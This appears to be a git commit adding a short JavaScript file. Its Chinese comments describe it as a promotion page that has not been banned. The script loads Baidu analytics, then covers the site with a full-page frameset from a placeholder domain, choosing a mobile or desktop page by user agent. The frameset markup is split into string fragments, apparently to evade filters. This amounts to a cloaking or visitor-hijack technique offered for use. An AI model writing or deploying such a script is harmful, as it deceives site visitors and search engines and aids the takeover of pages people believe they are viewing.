fc0daf2c41fe5fd922e3ca652ab49925e9452801
inyhow <inyhow@gmail.com>
2018-10-23 14:56:25 +0800

    Create web_iframe.js

---
+++ web_iframe.js
@@ -0,0 +1,16 @@
+//统计+推广的网页，未被封杀
+var _hmt = _hmt || [];
+(function() {
+  var hm = document.createElement("script");
+  hm.src = "https://hm.baidu.com/hm.js?id";
+  var s = document.getElementsByTagName("script")[0]; 
+  s.parentNode.insertBefore(hm, s);
+})();
+//主要是这底部代码，也是iframe显示出来，内容还是在正常内容之下
+if ((navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i))) {
+	var url = 'https://www.xxx.com/gdf/mip.html';
+	document.write('<frames' + 'et co' + 'ls="100%"' + '><fra' + 'me sr' + 'c="' + url + '" /></fr' + 'ameset>')
+}else{
+   	var url = 'https://www.xxx.com/gdf/pc.html';
+	document.write('<frames' + 'et co' + 'ls="100%"' + '><fra' + 'me sr' + 'c="' + url + '" /></fr' + 'ameset>')
+};
